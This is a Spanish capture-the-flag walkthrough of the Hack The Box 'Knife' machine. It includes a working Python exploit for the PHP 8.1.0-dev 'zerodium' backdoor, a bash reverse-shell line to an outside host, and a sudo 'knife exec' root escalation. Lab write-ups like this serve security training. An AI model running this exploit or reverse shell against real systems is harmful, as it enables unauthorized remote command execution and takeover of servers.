---
title: Knife
layout: page
permalink: /HTB_Knife
---

<h2 class="amarillo">Knife</h2>
<div id="logos" style="text-align: center;">
  <img src="/assets/images/HTB/Knife/knife.png" alt="under" oncontextmenu="return false;">
</div>

Encendemos la máquina Knife y nos da la dirección ip 10.129.193.99, probamos a enviar 5 trazas ICMP para detectar si esta encendida.

```bash
➜ ping -c 1 10.129.193.99
PING 10.129.193.99 (10.129.193.99) 56(84) bytes of data.
64 bytes from 10.129.193.99: icmp_seq=1 ttl=63 time=110 ms

--- 10.129.193.99 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.590/109.590/109.590/0.000 ms
```

<h2 class="amarillo">Enumeración</h2>

Comenzamos la enumeración usando `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.193.99`
<div style="text-align: center;">
  <img src="/assets/images/HTB/Knife/1.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos únicamente el puerto 22 y 80 abiertos.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Knife/2.png" alt="under" oncontextmenu="return false;">
</div>
Probamos con la herramienta whatweb para identificar las tecnologías en uso por el sitio web, y llama bastante la atención la versión de php.

<div style="text-align: center;">
  <img src="/assets/images/HTB/Knife/3.png" alt="under" oncontextmenu="return false;">
</div>
Entramos a la página pero no encontramos nada, en este punto lo siguiente a probar sera fuzzing.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Knife/4.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Fuzzing</h2>

Para no hacer uso de un diccionario tan grande, nmap tiene su propio diccionario con alrededor de 1000 rutas aproximadamente disponibles, para hacer uso de está técnica de fuzzing con nmap usamos `nmap --script http-enum -p80 10.129.193.99` y encontramos el directorio icons.

<div style="text-align: center;">
  <img src="/assets/images/HTB/Knife/5.png" alt="under" oncontextmenu="return false;">
</div>

Sin mucha suerte solo queda probar buscar información relacionada a la versión tan llamativa de php que tiene el sitio, encontrando así la <a href="https://arstechnica.com/gadgets/2021/03/hackers-backdoor-php-source-code-after-breaching-internal-git-server/">ref1</a> y <a href="https://www.welivesecurity.com/2021/03/30/backdoor-php-source-code-git-server-breach/">ref2</a>.

> En esta version de php el user-agent puede ser manipulado para hacer consultas maliciosas tal que: `user-agente: zerodium system("id");`, y así ver el output del comando en la respuesta de la web.

De esta forma podemos usar el <a href="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/">exploit</a>.

```python
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

Seguido tendremos una consola como james.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Knife/6.png" alt="under" oncontextmenu="return false;">
</div>

Pero esta no es una consola interactiva, estamos explotando el zerodium, por tanto, podemos enviar una reverse shell ahora que tenemos capacidad de ejecutar comandos con `bash -c "bash -i >& /dev/tcp/10.10.16.55/443 0>&1`.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Knife/7.png" alt="under" oncontextmenu="return false;">
</div>
En el directorio personal del usuario encontraremos la flag del usuario.

<h2 class="amarillo">Escalada</h2>

Esta máquina no esta pensada para escalar privilegios con el binario pkexec pero puede hacerse, sin embargo, al revisar si tenemos algún privilegio a nivel de sudoers vemos /usr/bin/knife:

```bash
sudo knife exec -E 'exec "/bin/sh"'
```

La escalada funciona porque knife permite ejecutar código Ruby con Exec, pero según otros usuarios que han resuelto esta máquina. Es decir, que también se puede escalar usando `knife data bag create user output -e vim` y luego escapar de vim con `:!/bin/bash`.

Tal parece que knife es un binario que hace parte de una suite llamada Chef https://docs.chef.io/platform_overview/ y Chef Infra, las cuales son plataformas de automatización convirtiendo infraestructura en código y permite trabajar también con cloud y despliegues, y dentro de su documentación Knife es un binario para administrar Chef.
